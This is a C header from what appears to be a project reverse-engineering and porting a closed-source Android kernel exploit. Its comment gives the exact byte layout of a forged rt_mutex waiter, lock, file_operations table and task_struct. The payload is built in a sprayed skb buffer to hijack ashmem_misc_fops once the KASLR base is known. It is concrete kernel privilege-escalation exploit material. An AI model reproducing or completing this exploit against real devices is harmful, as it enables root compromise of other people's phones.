#ifndef OSS_CLONE_FOPS_INSTALL_H
#define OSS_CLONE_FOPS_INSTALL_H

#include <stdint.h>

#define FOPS_INSTALL_PAGE_SIZE 0x8e80

/* source: FUN_00106288 (param_1==0 branch) + FUN_001061ac, ported
 * byte-exact from the decompile+register trace done this session (see
 * chat for the full derivation). Builds, in a local zeroed buffer, the
 * SAME bytes the closed binary writes into its skb user-data buffer.
 * `aligned_base` is A = candidate & ~0x7fff. Buffer offsets are relative
 * to D, the skb user-data start; on this route D=A-0xe80. Consequently,
 * scratch+0x2000 lands at A+0x1180, scratch+0x2210 at A+0x1390,
 * scratch+0x2350 at A+0x14d0, and scratch+0x3200 at A+0x2380:
 *
 *   scratch+0x2210  fake "lock" object (owner=0)
 *   scratch+0x2218  lock.waiters.rb_root     = aligned_base | 0x14d0
 *   scratch+0x2220  lock.waiters.rb_leftmost = aligned_base | 0x14d0
 *   scratch+0x2228  lock.owner = 1
 *   scratch+0x2350  fake rt_mutex_waiter (FAKE_WAITER_* offsets):
 *     tree_entry        = {parent_color=1, right=0, left=0}
 *     pi_tree_entry      = {parent_color=aligned_base|0x1180,
 *                            right=ASHMEM_MISC_FOPS (real kernel target),
 *                            left=0}
 *     task               = INIT_TASK (real kernel address, NOT a forged
 *                          task_struct -- this is the field this project's
 *                          existing src/util.c:put_slide_bank_entry got
 *                          wrong: it used a forged fake_task here instead
 *                          of the real init_task)
 *     lock               = aligned_base | 0x1390
 *     wake_state         = 0
 *     prio               = 0x82 (130 -- also differs from the existing
 *                          engine's SLIDE_FAKE_WAITER_PRIO=0)
 *     deadline           = 0
 *     ww_ctx             = 0
 *   scratch+0x2000  fake file_operations table (FOPS_OFF), only used
 *     because ashmem_misc_fops->owner/ops end up pointing here once the
 *     waiter corruption lands -- real kernel function pointers, all
 *     computed from kernel_base + target.h's *_OFF constants:
 *       owner=0, llseek=aligned_base|0x14e8 (self-ref scratch, NOT
 *       noop_llseek -- ported exactly as decompiled/disassembled, not
 *       "corrected" to what might seem more natural), read=0, write=0,
 *       read_iter=CONFIGFS_READ_ITER, write_iter=CONFIGFS_BIN_WRITE_ITER,
 *       ioctl=ASHMEM_IOCTL, compat_ioctl=ASHMEM_COMPAT_IOCTL,
 *       mmap=ASHMEM_MMAP, open=ASHMEM_OPEN, release=ASHMEM_RELEASE,
 *       splice_read=COPY_SPLICE_READ, show_fdinfo=ASHMEM_SHOW_FDINFO.
 *   scratch+0x3200  fake task_struct (FAKE_TASK_OFF), verified against
 *     the same *_OFF layout as target.h's FAKE_TASK_* (independently
 *     confirmed via BTF/pahole earlier this session):
 *       usage=0x100, prio=0x78, normal_prio=0x78, pi_lock=0,
 *       pi_waiters={aligned_base|0x14e8, aligned_base|0x14e8} (self-ref,
 *       SAME value as the fake fops llseek slot above),
 *       task_group=ROOT_TASK_GROUP (real), pi_top_task=INIT_TASK (real),
 *       pi_blocked_on=0.
 *   scratch+0x4440  extra fake rb_node (RIGHT_OFF): {aligned_base|0x1180,
 *     0, 0} -- same parent_color value as the waiter's pi_tree_entry.
 *   scratch+0x5550  extra fake rb_node (LEFT_OFF): identical to RIGHT_OFF.
 *
 * This function only builds the bytes; it does not spray them into the
 * kernel yet (that is FUN_00106288's earlier sendmsg step, still being
 * ported) and does not touch any kernel object. Safe to call/test
 * standalone. kernel_base is the already-resolved KASLR base (needed to
 * compute the real function-pointer values above). */
void build_fops_install_object(unsigned char *scratch, uint64_t aligned_base,
                                uint64_t kernel_base,
                                uint64_t ashmem_misc_fops_addr,
                                uint64_t init_task_addr);

#endif
